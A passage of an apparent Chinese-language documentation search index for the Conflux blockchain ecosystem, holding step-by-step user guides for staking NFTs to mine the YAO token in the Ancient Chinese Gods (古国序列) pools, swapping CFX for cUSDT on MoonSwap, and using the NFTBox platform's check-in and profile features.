\u53ea\u8981\u6709\u53e4\u56fd\u5e8f\u5217\u652f\u6301\u7684NFT\uff0c\u8d28\u62bc\u81f3\u5176\u5408\u7ea6\u5185\uff0c\u5373\u53ef\u6316yao\uff0c\u6b64\u5904\u4ee5\u6df7\u5408\u77ff\u6c60\u4e3a\u4f8b\uff0c\u7b14\u8005\u6301\u6709yuki NFT\u548cTrea NFT\u5404\u4e00\u4e2a\uff0c\u672c\u8282\u5c06\u4ecb\u7ecd\u5c06NFT\u8d28\u62bc\u5230\u53e4\u56fd\u7684\u6df7\u5408NFT\u77ff\u6c60\u5185\u6316\u77ff\u7684\u6b65\u9aa4\u3002 \u70b9\u51fb\u6df7\u5408NFT\u7ba1\u7406\u6309\u94ae \u70b9\u51fb\u4e0a\u56fe\u4e2d\u7684\u201c\u8f6c\u5165\u201d\u6309\u94ae\uff0c\u52fe\u9009NFT\uff0c\u518d\u6b21\u70b9\u51fb\u4e0b\u56fe\u4e2d\u7684\u201c\u8f6c\u5165\u201d\u6309\u94ae \u786e\u8ba4\u8f6c\u5165\u4ea4\u6613 \u786e\u8ba4\u6210\u529f \u70b9\u51fb\u4efb\u610f\u4e00\u4e2a\u8d28\u62bc\u6309\u94ae \u52fe\u9009\u9700\u8981\u8d28\u62bc\u7684NFT\uff0c\u5e76\u70b9\u51fb\u8d28\u62bc\u6309\u94ae \u786e\u8ba4\u4ea4\u6613 \u8d28\u62bc\u6210\u529f \u4ece\u6df7\u5408\u77ff\u6c60\u53d6\u56deNFT \u00b6 \u70b9\u51fb\u201d\u53d6\u56de\u201c\u6216\u201d\u5168\u90e8\u53d6\u56de\u201c\u6309\u94ae \u786e\u8ba4\u4ea4\u6613 \u8fd9\u65f6\uff0c\u5982\u679c\u4f60\u8bbf\u95ee Tspace\u6211\u7684Space \uff0c\u4f60\u4f1a\u53d1\u73b0\u81ea\u5df1\u7684\u8d26\u6237\u91cc\u770b\u4e0d\u5230yuki\u8fd9\u4e2aNFT\uff0c\u539f\u56e0\u662f\uff1a\u5c1a\u672a\u901a\u8fc7\u6df7\u5408NFT\u7ba1\u7406\u5c06yuki\u53d6\u51fa\u5230\u60a8\u7684\u94b1\u5305\u4e2d \u70b9\u51fb\u6df7\u5408NFT\u7ba1\u7406 \u52fe\u9009Yuki NFT\uff0c\u5e76\u70b9\u51fb\u8f6c\u51fa \u786e\u8ba4\u4ea4\u6613 \u8bbf\u95ee Tspace\u6211\u7684Space \uff0c\u70b9\u51fb\u201c\u5237\u65b0\u6211\u7684NFT\u201d\uff0c\u540e\u53ef\u4ee5\u770b\u5230yuki NFT\u5df2\u51fa\u73b0 \u6536\u53d6\u4ee3\u5e01yao \u00b6 \u8d28\u62bcNFT\u6316\u51fa\u7684yao\uff0c\u53ef\u4ee5\u901a\u8fc7\u70b9\u51fb \u53e4\u56fd\u5e8f\u5217NFT\u77ff\u6c60 \u4e2d\u7684\u201c\u4e00\u952e\u63d0\u53d6\u201d\u6309\u94ae\u5b8c\u6210\u6536\u77ff YAO\u4ee3\u5e01\u5408\u7ea6\u5730\u5740\uff1acfx:acaucwuza1nm7wfj1bwk jttz7b0eh4ak7ur7fue1dy \u4f60\u53ef\u4ee5\u901a\u8fc7\u53c2\u8003 \u6dfb\u52a0CRC20\u4ee3\u5e01\u5230Portal\u7684\u65b9\u6cd5\u6b65\u9aa4 \u5c06\u4ee3\u5e01yao\u6dfb\u52a0\u81f3Portal\u7684\u4ee3\u5e01\u5217\u8868\u4e2d\u3002","title":"\u53e4\u56fd\u5e8f\u5217"},{"location":"ecosystem/guguo/#_1","text":"","title":"\u53e4\u56fd\u5e8f\u5217"},{"location":"ecosystem/guguo/#_2","text":"\u53e4\u56fd\u5e8f\u5217 Ancient Chinese Gods\u662f\u4ee5\u300c\u4e2d\u56fd\u5168\u7cfb\u5217\u795e\u8bdd\u4f20\u8bf4\u300d\u4e3a\u7075\u611f\u6253\u9020\u7684\u52a0\u5bc6\u85cf\u54c1\u548c\u533a\u5757\u94fe\u7ade\u6280\u6e38\u620f\u3002\u53e4\u56fd\u5e8f\u5217NFT\u6536\u85cf\u5361\u7531\u5927\u91cf\u827a\u672f\u5bb6\u539f\u521b\uff0c\u6d89\u53ca10\u4e2a\u521b\u4f5c\u6bcd\u9898\u548c130\u4e2a\u521b\u4f5c\u84dd\u672c\u3002\u53e4\u56fd\u5e8f\u5217 NFT \u6536\u85cf\u5361\u96c6\u5408\u4e86 DeFi \u6d41\u52a8\u6027\u6316\u77ff\u548c\u7a00\u7f3a\u6027\u8bbe\u8ba1\uff0c\u662f\u53e4\u56fd\u5e8f\u5217\u7ade\u6280\u6e38\u620f\u7684\u91cd\u8981\u57fa\u7840\u3002374 \u5929\u7684 NFT \u53d1\u884c\u671f\u5c06\u6700\u5c11\u53d1\u884c 130 \u4e2a\u7ecf\u5178\u795e\u8bdd IP\u3002\u53e4\u56fd\u5e8f\u5217\u5df2\u7ecf\u90e8\u7f72\u5728Conflux\u516c\u94fe\u548c\u4ee5\u592a\u574a\u4e0a\u3002","title":"\u751f\u6001\u4ecb\u7ecd"},{"location":"ecosystem/guguo/#token","text":"\u53e4\u56fd\u8d27\u5e01YAO \u662f\u4e00\u79cd ERC20 token\uff0c\u603b\u91cf\u662f100W\uff0c\u7528\u6237\u53ef\u4ee5\u4f7f\u7528\u8d28\u62bcYAO\u6765\u83b7\u53d6XIANG\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7Swap\u8fdb\u884c\u4ea4\u6613\u3002XIANG\u53ef\u4ee5\u62bd\u53d6\u201c\u53e4\u56fd\u5e8f\u5217\u201d\u4e2d\u7684\u5404\u7c7bNFT \u5361\u724c\uff0c\u6240\u6709\u53e4\u56fd\u5e8f\u5217 NFT \u5747\u53ef\u5728 Tspace \u81ea\u7531\u4ea4\u6613\u3002 \u723bYAO\u7684\u603b\u91cf\u662f100\u4e07\u679a\uff0c\u5206\u53d1\u91c7\u7528\u7684\u662f\u7ebf\u6027\u5206\u53d1\uff0c\u521d\u59cb\u768414\u5929\u9ec4\u91d1\u5934\u77ff\uff0c\u53ef\u4ee5\u6316\u53d6\u603b\u91cf\u768430%\u3002\u5728conflux \u94fe\u4e0a\u94f8\u5e01100w,\u5176\u4e2d\u4ee5\u592a\u574a\u53d1\u884c10w\u901a\u8fc7shuttleflow \u8de8\u94fe\u5230\u4ee5\u592a\u574a.conflux \u94fe\u4e0a\u53d1\u884c90w.\u53e4\u56fd\u5e8f\u5217\u5c06\u901a\u8fc7\u6d41\u52a8\u6027\u6316\u77ff\u7684\u65b9\u5f0f\u5411\u77ff\u5de5\u5206\u53d1 YAO\uff0c\u77ff\u5de5\u53ef\u8d28\u62bc\u77e5\u540d NFT \u8d44\u4ea7\u5982 meme NFT\u3001Moonswap \u521b\u4e16 NFT\u3001FLUX NFT\u3001\u70e4\u4ed4NFT\u3001\u53e4\u56fd\u5e8f\u5217NFT\u3001Trea NFT\u3001Yuki NFT\u7684\u5f62\u5f0f\u6316\u77ff\u83b7\u5f97 YAO\u3002","title":"Token\u4ecb\u7ecd"},{"location":"ecosystem/guguo/#_3","text":"\u53e4\u56fd\u5e8f\u5217\u4e3b\u9875 NFT\u8d28\u62bc\u6316\u77ff\u9875\u9762","title":"\u751f\u6001\u94fe\u63a5"},{"location":"ecosystem/guguo/#nftyao","text":"\u9996\u5148\u60a8\u9700\u8981\u914d\u7f6e\u4e00\u4e2aConflux Portal\u94b1\u5305\uff0c \u914d\u7f6e\u6559\u7a0b \uff0c\u4e14\u94b1\u5305\u4e2d\u9700\u8981\u6301\u6709\u53e4\u56fd\u652f\u6301\u7684NFT\u8d44\u4ea7\u3002 \u53ea\u8981\u6709\u53e4\u56fd\u5e8f\u5217\u652f\u6301\u7684NFT\uff0c\u8d28\u62bc\u81f3\u5176\u5408\u7ea6\u5185\uff0c\u5373\u53ef\u6316yao\uff0c\u6b64\u5904\u4ee5\u6df7\u5408\u77ff\u6c60\u4e3a\u4f8b\uff0c\u7b14\u8005\u6301\u6709yuki NFT\u548cTrea NFT\u5404\u4e00\u4e2a\uff0c\u672c\u8282\u5c06\u4ecb\u7ecd\u5c06NFT\u8d28\u62bc\u5230\u53e4\u56fd\u7684\u6df7\u5408NFT\u77ff\u6c60\u5185\u6316\u77ff\u7684\u6b65\u9aa4\u3002 \u70b9\u51fb\u6df7\u5408NFT\u7ba1\u7406\u6309\u94ae \u70b9\u51fb\u4e0a\u56fe\u4e2d\u7684\u201c\u8f6c\u5165\u201d\u6309\u94ae\uff0c\u52fe\u9009NFT\uff0c\u518d\u6b21\u70b9\u51fb\u4e0b\u56fe\u4e2d\u7684\u201c\u8f6c\u5165\u201d\u6309\u94ae \u786e\u8ba4\u8f6c\u5165\u4ea4\u6613 \u786e\u8ba4\u6210\u529f \u70b9\u51fb\u4efb\u610f\u4e00\u4e2a\u8d28\u62bc\u6309\u94ae \u52fe\u9009\u9700\u8981\u8d28\u62bc\u7684NFT\uff0c\u5e76\u70b9\u51fb\u8d28\u62bc\u6309\u94ae \u786e\u8ba4\u4ea4\u6613 \u8d28\u62bc\u6210\u529f","title":"\u8d28\u62bcNFT\u6316yao"},{"location":"ecosystem/guguo/#nft","text":"\u70b9\u51fb\u201d\u53d6\u56de\u201c\u6216\u201d\u5168\u90e8\u53d6\u56de\u201c\u6309\u94ae \u786e\u8ba4\u4ea4\u6613 \u8fd9\u65f6\uff0c\u5982\u679c\u4f60\u8bbf\u95ee Tspace\u6211\u7684Space \uff0c\u4f60\u4f1a\u53d1\u73b0\u81ea\u5df1\u7684\u8d26\u6237\u91cc\u770b\u4e0d\u5230yuki\u8fd9\u4e2aNFT\uff0c\u539f\u56e0\u662f\uff1a\u5c1a\u672a\u901a\u8fc7\u6df7\u5408NFT\u7ba1\u7406\u5c06yuki\u53d6\u51fa\u5230\u60a8\u7684\u94b1\u5305\u4e2d \u70b9\u51fb\u6df7\u5408NFT\u7ba1\u7406 \u52fe\u9009Yuki NFT\uff0c\u5e76\u70b9\u51fb\u8f6c\u51fa \u786e\u8ba4\u4ea4\u6613 \u8bbf\u95ee Tspace\u6211\u7684Space \uff0c\u70b9\u51fb\u201c\u5237\u65b0\u6211\u7684NFT\u201d\uff0c\u540e\u53ef\u4ee5\u770b\u5230yuki NFT\u5df2\u51fa\u73b0","title":"\u4ece\u6df7\u5408\u77ff\u6c60\u53d6\u56deNFT"},{"location":"ecosystem/guguo/#yao","text":"\u8d28\u62bcNFT\u6316\u51fa\u7684yao\uff0c\u53ef\u4ee5\u901a\u8fc7\u70b9\u51fb \u53e4\u56fd\u5e8f\u5217NFT\u77ff\u6c60 \u4e2d\u7684\u201c\u4e00\u952e\u63d0\u53d6\u201d\u6309\u94ae\u5b8c\u6210\u6536\u77ff YAO\u4ee3\u5e01\u5408\u7ea6\u5730\u5740\uff1acfx:acaucwuza1nm7wfj1bwk jttz7b0eh4ak7ur7fue1dy \u4f60\u53ef\u4ee5\u901a\u8fc7\u53c2\u8003 \u6dfb\u52a0CRC20\u4ee3\u5e01\u5230Portal\u7684\u65b9\u6cd5\u6b65\u9aa4 \u5c06\u4ee3\u5e01yao\u6dfb\u52a0\u81f3Portal\u7684\u4ee3\u5e01\u5217\u8868\u4e2d\u3002","title":"\u6536\u53d6\u4ee3\u5e01yao"},{"location":"ecosystem/introduction/","text":"\u751f\u6001\u4ecb\u7ecd \u00b6 \u80cc\u666f \u00b6 \u4f5c\u4e3a\u4e00\u6b3e\u4f18\u79c0\u7684\u516c\u94fe\u7f51\u7edc\uff0c\u6709\u8bb8\u591a\u533a\u5757\u94fe\u751f\u6001\u5df2\u57fa\u4e8eConflux\u7f51\u7edc\u751f\u6839\u53d1\u82bd\u3002 \u751f\u6001\u603b\u89c8 \u00b6 \u56fe\u7247\u6765\u81ea MAO CRYPTO \u56fe\u7247\u6765\u81ea \u8bba\u575b","title":"\u751f\u6001\u4ecb\u7ecd"},{"location":"ecosystem/introduction/#_1","text":"","title":"\u751f\u6001\u4ecb\u7ecd"},{"location":"ecosystem/introduction/#_2","text":"\u4f5c\u4e3a\u4e00\u6b3e\u4f18\u79c0\u7684\u516c\u94fe\u7f51\u7edc\uff0c\u6709\u8bb8\u591a\u533a\u5757\u94fe\u751f\u6001\u5df2\u57fa\u4e8eConflux\u7f51\u7edc\u751f\u6839\u53d1\u82bd\u3002","title":"\u80cc\u666f"},{"location":"ecosystem/introduction/#_3","text":"\u56fe\u7247\u6765\u81ea MAO CRYPTO \u56fe\u7247\u6765\u81ea \u8bba\u575b","title":"\u751f\u6001\u603b\u89c8"},{"location":"ecosystem/moonswap/","text":"moonswap\u751f\u6001 \u00b6 \u751f\u6001\u4ecb\u7ecd \u00b6 MoonSwap\uff1a\u57fa\u4e8e\u4ee5\u592a\u574a\u548cConflux\uff0c\u5177\u6709\u9ad8\u901f\u30010 GAS \u7279\u6027\u7684AMM DEX\uff0cMoonswap\u56e2\u961f\u5f00\u53d1\u4e86MoonSwap\u548cMoon Token\u3002\u5b83\u5411AMM\u5f15\u5165\u4e86\u7b2c2\u5c42\u89e3\u51b3\u65b9\u6848\uff0c\u56e0\u6b64\u5728\u4ee5\u592a\u574a\u4e0a\u6301\u6709\u8d44\u4ea7\u7684\u7528\u6237\u8fd8\u53ef\u4ee5\u4eab\u53d7\u201c\u9ad8\u901f\u4e140GAS\u8d39\u7528\u201d\u7684\u4f53\u9a8c\uff0c\u540c\u65f6\u8fd8\u53ef\u4ee5\u5b9e\u73b0\u66f4\u9ad8\u7684\u8d44\u4ea7\u5229\u7528\u7387\u3002 \u751f\u6001\u94fe\u63a5 \u00b6 Moonswap \u4f7f\u7528moonswap\u5356\u51faCFX\u8d2d\u4e70CUSDT \u00b6 \u8bbf\u95ee moonswap\u4ea4\u6613\u6a21\u5757 \uff0c\u70b9\u51fb\u8fde\u63a5\u94b1\u5305\u6309\u94ae\uff0c Conflux Portal\u5b89\u88c5\u6559\u7a0b \u5f53\u5f39\u51fa\u7684\u7a97\u53e3\u51fa\u73b0\u65f6\u9009\u62e9\u8981\u8fde\u63a5\u7684\u94b1\u5305\u5730\u5740\uff0c\u70b9\u51fb \"\u63d0\u4ea4\"\uff0c\u5c06\u60a8\u7684Conflux Portal \u94b1\u5305\u8fde\u63a5\u5230Moonswap \u9009\u62e9\u5356\u51faToken\u548c\u4e70\u5165Token\uff0c\u5982\u5356\u51faCFX\uff0c\u4e70\u5165cUSDT \u586b\u5165\u5151\u6362\u6570\u91cf\uff0c\u7136\u540e\u6309 \"\u5151\u6362 \"\u6309\u94ae \u70b9\u51fb \"\u786e\u8ba4\u5151\u6362\"\uff1b \u5728\u5f39\u51fa\u7684Portal\u4ea4\u6613\u786e\u8ba4\u4e2d\uff0c\u70b9\u51fb\u786e\u8ba4\u6309\u94ae\uff0c\u4ee5\u5151\u6362CFX\u4e3acUSDT \u5f53 \"\u4ea4\u6613\u5df2\u63d0\u4ea4 \"\u7a97\u53e3\u51fa\u73b0\u65f6\uff0c\u610f\u5473\u7740\u4ea4\u6613\u5df2\u7ecf\u5f00\u59cb\u6267\u884c\uff1b \u7b49\u5f85\u51e0\u79d2\u949f\u7684\u6210\u529f\u4fe1\u606f\uff0c\u4f60\u5c31\u53ef\u4ee5\u5728ConfluxScan\u4e2d\u67e5\u770b\u8be5\u4ea4\u6613\uff1b \u73b0\u5728\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7Portal\u67e5\u770bcUSDT\u4f59\u989d Note \u200b \u5728Portal\u4e2d\u6dfb\u52a0cUSDT\u7684\u65b9\u6cd5\u89c1 \u6dfb\u52a0 CRC20 \u4ee3\u5e01\u5230 Portal \u7684\u65b9\u6cd5\u4e0e\u6b65\u9aa4","title":"moonswap\u751f\u6001"},{"location":"ecosystem/moonswap/#moonswap","text":"","title":"moonswap\u751f\u6001"},{"location":"ecosystem/moonswap/#_1","text":"MoonSwap\uff1a\u57fa\u4e8e\u4ee5\u592a\u574a\u548cConflux\uff0c\u5177\u6709\u9ad8\u901f\u30010 GAS \u7279\u6027\u7684AMM DEX\uff0cMoonswap\u56e2\u961f\u5f00\u53d1\u4e86MoonSwap\u548cMoon Token\u3002\u5b83\u5411AMM\u5f15\u5165\u4e86\u7b2c2\u5c42\u89e3\u51b3\u65b9\u6848\uff0c\u56e0\u6b64\u5728\u4ee5\u592a\u574a\u4e0a\u6301\u6709\u8d44\u4ea7\u7684\u7528\u6237\u8fd8\u53ef\u4ee5\u4eab\u53d7\u201c\u9ad8\u901f\u4e140GAS\u8d39\u7528\u201d\u7684\u4f53\u9a8c\uff0c\u540c\u65f6\u8fd8\u53ef\u4ee5\u5b9e\u73b0\u66f4\u9ad8\u7684\u8d44\u4ea7\u5229\u7528\u7387\u3002","title":"\u751f\u6001\u4ecb\u7ecd"},{"location":"ecosystem/moonswap/#_2","text":"Moonswap","title":"\u751f\u6001\u94fe\u63a5"},{"location":"ecosystem/moonswap/#moonswapcfxcusdt","text":"\u8bbf\u95ee moonswap\u4ea4\u6613\u6a21\u5757 \uff0c\u70b9\u51fb\u8fde\u63a5\u94b1\u5305\u6309\u94ae\uff0c Conflux Portal\u5b89\u88c5\u6559\u7a0b \u5f53\u5f39\u51fa\u7684\u7a97\u53e3\u51fa\u73b0\u65f6\u9009\u62e9\u8981\u8fde\u63a5\u7684\u94b1\u5305\u5730\u5740\uff0c\u70b9\u51fb \"\u63d0\u4ea4\"\uff0c\u5c06\u60a8\u7684Conflux Portal \u94b1\u5305\u8fde\u63a5\u5230Moonswap \u9009\u62e9\u5356\u51faToken\u548c\u4e70\u5165Token\uff0c\u5982\u5356\u51faCFX\uff0c\u4e70\u5165cUSDT \u586b\u5165\u5151\u6362\u6570\u91cf\uff0c\u7136\u540e\u6309 \"\u5151\u6362 \"\u6309\u94ae \u70b9\u51fb \"\u786e\u8ba4\u5151\u6362\"\uff1b \u5728\u5f39\u51fa\u7684Portal\u4ea4\u6613\u786e\u8ba4\u4e2d\uff0c\u70b9\u51fb\u786e\u8ba4\u6309\u94ae\uff0c\u4ee5\u5151\u6362CFX\u4e3acUSDT \u5f53 \"\u4ea4\u6613\u5df2\u63d0\u4ea4 \"\u7a97\u53e3\u51fa\u73b0\u65f6\uff0c\u610f\u5473\u7740\u4ea4\u6613\u5df2\u7ecf\u5f00\u59cb\u6267\u884c\uff1b \u7b49\u5f85\u51e0\u79d2\u949f\u7684\u6210\u529f\u4fe1\u606f\uff0c\u4f60\u5c31\u53ef\u4ee5\u5728ConfluxScan\u4e2d\u67e5\u770b\u8be5\u4ea4\u6613\uff1b \u73b0\u5728\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7Portal\u67e5\u770bcUSDT\u4f59\u989d Note \u200b \u5728Portal\u4e2d\u6dfb\u52a0cUSDT\u7684\u65b9\u6cd5\u89c1 \u6dfb\u52a0 CRC20 \u4ee3\u5e01\u5230 Portal \u7684\u65b9\u6cd5\u4e0e\u6b65\u9aa4","title":"\u4f7f\u7528moonswap\u5356\u51faCFX\u8d2d\u4e70CUSDT"},{"location":"ecosystem/nft-box/","text":"NFTBox\u521b\u65b0\u578b\u8d44\u4ea7\u4ea4\u4e92\u5e73\u53f0 \u00b6 \u751f\u6001\u4ecb\u7ecd \u00b6 \u57fa\u4e8eConflux\u5e95\u5c42\u5f00\u53d1\uff0c\u529b\u6c42\u62d3\u5c55\u66f4\u591a\u7684NFT\u4ea4\u4e92\u573a\u666f\u3001\u89e3\u51b3NFT\u5e02\u573a\u75db\u70b9\u3001\u6ee1\u8db3\u65e5\u76ca\u589e\u52a0\u7684\u7528\u6237\u9700\u6c42\u3002NFTBox\u91c7\u7528\u53bb\u4e2d\u5fc3\u5316\u7684\u4ea4\u6613\u64ae\u5408\uff0c\u4f7f\u5f97NFT\u8d44\u4ea7\u4ea4\u4e92\u66f4\u52a0\u5b89\u5168\u3001\u516c\u5f00\u548c\u900f\u660e\u3002 \u672a\u6765\u5c06\u4f1a\u6253\u901a\u4e09\u5927\u4ea4\u6613\u6240\u516c\u94fe\u5e76\u9010\u6b65\u5411\u5176\u5b83\u4e3b\u6d41\u516c\u94fe\u8fdb\u53d1\uff0c\u6765\u7e41\u8363\u6574\u4e2a\u751f\u6001\u53d1\u5c55\u3002 NFTBox\u5c06\u79c9\u627f\u7740\u7528\u6237\u4f53\u9a8c\u4e3a\u6700\u4f18\u5148\u7ea7\uff0c\u652f\u6301\u624b\u673a\u7aef\u3001PC\u7aef\u7b49\u591a\u79cd\u7ec8\u7aef\u4ea7\u54c1\uff0c\u505a\u4e00\u5bb6\u9ad8\u6548\u3001\u521b\u65b0\u3001\u6709\u4ef7\u503c\u3001\u7528\u6237\u53cb\u597d\u7684NFT\u4ea4\u4e92\u5e73\u53f0\u3002 \u751f\u6001\u94fe\u63a5 \u00b6 NFTBox \u4e3b\u9875 \u751f\u6001\u529f\u80fd\u4ecb\u7ecd \u00b6 \u751f\u6001\u4e3b\u9875\u9875\u9762\u5982\u4e0b\u6240\u793a\uff0c\u4e3b\u8981\u5305\u62ec\uff1a \u4e3b\u9875\uff1a\u5e73\u53f0\u63a8\u8350\u7684NFT\u8d44\u4ea7\u5c55\u793a\u4e0e\u8054\u64ad \u53d1\u73b0\uff1a\u901a\u8fc7\u641c\u7d22\u63a5\u53e3\u53d1\u73b0\u827a\u672f\u54c1\u548c\u827a\u672f\u5bb6 \u5546\u57ce\uff1a\u5305\u542b\u5f53\u524d\u6b63\u5728\u62cd\u5356\u6216\u4e00\u53e3\u4ef7\u552e\u5356\u7684NFT\u8d44\u4ea7 \u6d3b\u52a8\uff1a\u76f2\u76d2\u8d2d\u4e70\uff0c\u5c71\u6d77\u7ecf\u6e38\u620f\uff0c\u98de\u82b1\u4ee4NFT\u94f8\u9020\u6d3b\u52a8\u7b49 \u753b\u5eca\uff1a\u656c\u8bf7\u671f\u5f85 \u521b\u4f5c\uff1a\u652f\u6301\u7528\u6237\u6216\u827a\u672f\u5bb6\u81ea\u884c\u4e0a\u4f20\u56fe\u7247\u5e76\u94f8\u9020NFT \u6536\u85cf\uff1a\u5f53\u8fde\u63a5\u94b1\u5305\u540e\uff0c\u53ef\u4ee5\u67e5\u770b\u94b1\u5305\u5185\u4e2d\u7684NFT\uff0c\u7b7e\u5230\u83b7\u5f97\u8865\u5929\u77f3 \u5728\u54ea\u8d2d\u4e70NFT \u00b6 \u5728NFTBox\u7684 \u6d3b\u52a8\u9875\u9762 \u53ef\u4ee5\u8d2d\u4e70NFT \u70b9\u51fb\u8fdb\u5165\u6309\u94ae\u540e\uff0c\u53ef\u4ee5\u5728\u9875\u9762\u4e2d\u67e5\u770b\u5230\u5df2\u53d1\u552e\u6216\u5f85\u53d1\u552e\u7684NFT\u54c1\u7c7b \u4e0b\u62c9\u9875\u9762\uff0c\u53ef\u770b\u5230\u8d2d\u4e70\u5361\u5305\u6309\u94ae \u5728\u76f2\u76d2\u6709\u5269\u4f59\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u70b9\u51fb\u201c\u8d2d\u4e70\u5361\u5305\u201d\u6309\u94ae\uff0c\u652f\u4ed8token\u5e76\u8d2d\u4e70\u76f2\u76d2 \u8865\u5929\u77f3\u7b7e\u5230\u6559\u7a0b \u00b6 \u4f7f\u7528\u914d\u7f6e\u4e86Conflux Portal\u94b1\u5305\u7684\u6d4f\u89c8\u5668\u8bbf\u95ee NFTBox \u6536\u85cf\u9875 \uff0c\u7cfb\u7edf\u81ea\u52a8\u547c\u51faConflux Portal\u94b1\u5305\u8fde\u63a5\u9875\u9762 Note \u9700\u8981\u914d\u7f6eConflux Portal\u94b1\u5305\uff0c\u914d\u7f6e\u6559\u7a0b\u89c1 Portal \u5b89\u88c5\u914d\u7f6e\u6b65\u9aa4 \u9009\u62e9\u9700\u8981\u8fde\u63a5\u7684Conflux\u94b1\u5305\u8d26\u6237 \u8fde\u63a5\u540e\uff0c\u70b9\u51fb\u9875\u9762\u4e2d\u7b7e\u5230\u6309\u94ae \u81ea\u52a8\u547c\u51faConflux Portal\u7684\u5408\u7ea6\u4ea4\u4e92\u64cd\u4f5c\u63a5\u53e3\uff0c\u70b9\u51fb\u786e\u8ba4\u5373\u53ef\u7b7e\u5230\u83b7\u5f975\u4e2a\u8865\u5929\u77f3 Note \u5728\u7b7e\u5230\u5408\u7ea6\u4ee3\u4ed8\u989d\u5ea6\u4e0d\u8db3\u65f6\uff1a\u9700\u8981\u652f\u4ed8\u71c3\u6c14\u8d39+\u5b58\u50a8\u8d39\u624d\u80fd\u7b7e\u5230\u6210\u529f\uff0c\u5efa\u8bae\u5728\u5408\u7ea6\u4ee3\u4ed8\u6709\u989d\u5ea6\u7684\u65f6\u5019\u8fdb\u884c\u7b7e\u5230\u64cd\u4f5c\uff08\u56e0\u5408\u7ea6\u4ee3\u4ed8\u800c\u4e0d\u6d88\u8017\u4efb\u4f55cfx\uff09\u3002 \u66f4\u6362NFTBox\u5934\u50cf \u00b6 \u5728\u6301\u6709NFTBox\u5934\u50cfNFT\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5c06\u81ea\u5df1\u7684\u4e2a\u6027\u5316\u5934\u50cf\u53d8\u66f4\u4e3a\u60a8\u6301\u6709\u7684NFT\u6837\u5f0f\uff0c\u76ee\u524d\u5df2\u652f\u6301pixel\u70e4\u4ed4\u5934\u50cf\u3002 Pixel\u70e4\u4ed4\u6d3b\u52a8\u4ecb\u7ecd \u8bbf\u95ee NFTBox\u6536\u85cf\u9875\u9762 \uff0c\u8fde\u63a5\u94b1\u5305\u540e\u70b9\u51fb\u5934\u50cf\u53f3\u4e0b\u89d2\u6309\u94ae \u6311\u9009\u5934\u50cf \u70b9\u51fb\u559c\u6b22\u7684\u5934\u50cf\uff1a\u7531\u4e8e\u7b14\u8005\u53ea\u6709\u4e00\u4e2a\u5934\u50cfNFT\uff0c\u53ea\u80fd\u9009\u4ed6 \u70b9\u51fb\u786e\u5b9a\u6309\u94ae\uff0c\u4f1a\u547c\u51faPortal\u8fdb\u884c\u7b7e\u540d\uff0c\u70b9\u51fb\u7b7e\u540d\u5373\u53ef \u5934\u50cf\u53d8\u4e3aPunk \u66f4\u6362NFTBox\u79f0\u8c13 \u00b6 \u5728\u6301\u6709\u8bcdNFT\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5c06\u4e2a\u6027\u5316\u79f0\u8c13\u53d8\u66f4\u4e3a\u60a8\u6301\u6709\u8bcdNFT\u6240\u5bf9\u5e94\u7684\u5185\u5bb9 \u8bbf\u95ee NFTBox\u6536\u85cf\u9875\u9762 \uff0c\u8fde\u63a5\u94b1\u5305\u540e\u70b9\u51fb\u5934\u50cf\u4e0b\u65b9\u6635\u79f0\u53f3\u4fa7\u7684\u94c5\u7b14\u56fe\u6807 \u5728\u65b0\u51fa\u73b0\u7684\u9875\u9762\u53ef\u67e5\u770b\u4f60\u6301\u6709\u7684\u8bcdNFT\u6837\u5f0f \u9009\u4e2dNFT\uff0c\u5e76\u70b9\u51fb\u786e\u8ba4 \u901a\u8fc7Portal\u7b7e\u540d\u4ea4\u6613\u5373\u53ef\u66f4\u6362\u79f0\u8c13\u4e3a\u201c\u5355\u8584\u201d \u66f4\u6362NFTBox\u6635\u79f0 \u00b6 \u7528\u6237\u53ef\u6309\u7167\u81ea\u5df1\u7684\u559c\u597d\uff0c\u8c03\u6574\u5176\u5728NFTBox\u5e73\u53f0\u7684\u6635\u79f0 \u8bbf\u95ee NFTBox\u6536\u85cf\u9875\u9762 \uff0c\u8fde\u63a5\u94b1\u5305\u540e\u70b9\u51fb\u5934\u50cf\u4e0b\u65b9\u6635\u79f0\u53f3\u4fa7\u7684\u94c5\u7b14\u56fe\u6807 \u5728\u5f39\u51fa\u9875\u9762\u4e2d\u8f93\u5165\u7528\u6237\u5e0c\u671b\u8bbe\u7f6e\u7684\u6635\u79f0 \u7b7e\u540d\u4ea4\u6613 \u4fee\u6539\u6635\u79f0\u6210\u529f","title":"NFTBox\u521b\u65b0\u578b\u8d44\u4ea7\u4ea4\u4e92\u5e73\u53f0"},{"location":"ecosystem/nft-box/#nftbox","text":"","title":"NFTBox\u521b\u65b0\u578b\u8d44\u4ea7\u4ea4\u4e92\u5e73\u53f0"},{"location":"ecosystem/nft-box/#_1","text":"\u57fa\u4e8eConflux\u5e95\u5c42\u5f00\u53d1\uff0c\u529b\u6c42\u62d3\u5c55\u66f4\u591a\u7684NFT\u4ea4\u4e92\u573a\u666f\u3001\u89e3\u51b3NFT\u5e02\u573a\u75db\u70b9\u3001\u6ee1\u8db3\u65e5\u76ca\u589e\u52a0\u7684\u7528\u6237\u9700\u6c42\u3002NFTBox\u91c7\u7528\u53bb\u4e2d\u5fc3\u5316\u7684\u4ea4\u6613\u64ae\u5408\uff0c\u4f7f\u5f97NFT\u8d44\u4ea7\u4ea4\u4e92\u66f4\u52a0\u5b89\u5168\u3001\u516c\u5f00\u548c\u900f\u660e\u3002 \u672a\u6765\u5c06\u4f1a\u6253\u901a\u4e09\u5927\u4ea4\u6613\u6240\u516c\u94fe\u5e76\u9010\u6b65\u5411\u5176\u5b83\u4e3b\u6d41\u516c\u94fe\u8fdb\u53d1\uff0c\u6765\u7e41\u8363\u6574\u4e2a\u751f\u6001\u53d1\u5c55\u3002 